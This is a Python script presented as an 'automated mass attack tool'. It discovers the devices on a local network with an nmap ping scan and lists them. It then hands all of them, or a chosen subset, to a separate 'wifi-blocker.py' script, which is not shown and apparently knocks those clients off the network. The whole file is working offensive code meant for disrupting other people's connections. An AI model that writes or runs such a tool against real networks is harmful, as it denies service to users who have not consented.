#!/usr/bin/env python3
"""
Attack All Clients - Automated mass attack tool
"""

import subprocess
import sys
import os

def discover_clients(interface):
    """Discover all clients"""
    try:
        # Get network range
        result = subprocess.run(['ip', 'route', 'show', 'dev', interface], 
                              capture_output=True, text=True)
        network = None
        for line in result.stdout.split('\n'):
            if '/' in line and 'scope link' in line:
                network = line.split()[0]
                break
        
        if not network:
            return []
        
        # Scan with nmap
        result = subprocess.run(['nmap', '-sn', network], 
                              capture_output=True, text=True, timeout=60)
        
        clients = []
        lines = result.stdout.split('\n')
        current_ip = None
        
        for line in lines:
            if 'Nmap scan report for' in line:
                parts = line.split()
                current_ip = parts[-1].strip('()')
            elif 'MAC Address:' in line and current_ip:
                parts = line.split()
                mac = parts[2]
                if not current_ip.endswith('.1'):  # Exclude gateway
                    clients.append({'ip': current_ip, 'mac': mac})
                current_ip = None
        
        return clients
    except:
        return []

def main():
    if len(sys.argv) != 3 or sys.argv[1] != '-i':
        print("Attack All Clients")
        print("Usage: python3 attack-all.py -i <interface>")
        sys.exit(1)
    
    interface = sys.argv[2]
    
    if os.geteuid() != 0:
        print("❌ Run as root!")
        sys.exit(1)
    
    print("🎯 Attack All Clients")
    print("=" * 30)
    
    # Discover clients
    clients = discover_clients(interface)
    if not clients:
        print("❌ No clients found")
        sys.exit(1)
    
    print(f"✅ Found {len(clients)} clients:")
    for i, client in enumerate(clients, 1):
        print(f"{i:2d}. {client['ip']:<15} {client['mac']}")
    
    print("\n🎯 Options:")
    print("1. Attack ALL clients")
    print("2. Select specific clients")
    print("3. Exit")
    
    choice = input("\nChoice (1-3): ").strip()
    
    if choice == '1':
        confirm = input(f"\nAttack ALL {len(clients)} clients? (y/N): ").strip().lower()
        if confirm == 'y':
            target_ips = [c['ip'] for c in clients]
            cmd = ['python3', 'wifi-blocker.py', '-i', interface, '-t'] + target_ips
            subprocess.run(cmd)
    
    elif choice == '2':
        selection = input("Enter numbers (e.g., 1,3,5): ").strip()
        try:
            indices = [int(x.strip()) - 1 for x in selection.split(',')]
            selected = [clients[i] for i in indices if 0 <= i < len(clients)]
            if selected:
                target_ips = [c['ip'] for c in selected]
                cmd = ['python3', 'wifi-blocker.py', '-i', interface, '-t'] + target_ips
                subprocess.run(cmd)
        except:
            print("❌ Invalid selection")

if __name__ == "__main__":
    main()
